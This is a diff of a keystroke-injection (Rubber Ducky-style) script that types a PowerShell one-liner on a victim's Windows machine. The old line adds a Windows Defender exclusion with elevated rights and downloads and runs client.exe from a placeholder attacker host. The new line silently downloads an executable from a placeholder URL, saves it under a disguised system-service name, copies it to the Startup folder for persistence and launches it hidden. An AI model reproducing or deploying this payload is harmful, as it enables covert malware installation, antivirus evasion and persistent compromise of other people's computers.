@@ -3,7 +3,7 @@ DELAY 1000
 STRING cmd
 ENTER
 DELAY 1000
-STRING powershell.exe "$strtp=\"C:\Users\$env:username\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";Start-Process -Verb RunAs powershell.exe -Args '-executionpolicy bypass -command', \"Set-MpPreference -ExclusionPath '$strtp'\";cd $strtp;curl http://<yourip>:<yourport>/client.exe -o file.exe;start .\\file.exe"&&exit
+STRING powershell.exe "$url=\"<url_exe_da_iniettare>\";$out=\"$env:APPDATA\win_sys_service.exe\";$startup=\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win_sys_service.exe\";$ProgressPreference=\"SilentlyContinue\";(New-Object System.Net.WebClient).DownloadFile($url,$out);if(Test-Path $out){if(-not(Test-Path $startup)){Copy-Item $out $startup -Force};Start-Process $out -WindowStyle Hidden}"&&exit
 ENTER
 DELAY 200
 LEFTARROW
